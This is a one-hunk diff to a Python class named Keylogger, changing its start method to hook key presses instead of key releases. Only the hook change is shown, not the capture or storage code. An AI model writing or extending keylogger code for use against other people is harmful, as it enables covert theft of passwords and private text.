@@ -102,5 +102,5 @@ class Keylogger:
 
     def start(self):
         # start the keylogger
-        keyboard.on_release(callback=self.callback)
+        keyboard.on_press(callback=self.callback)
 
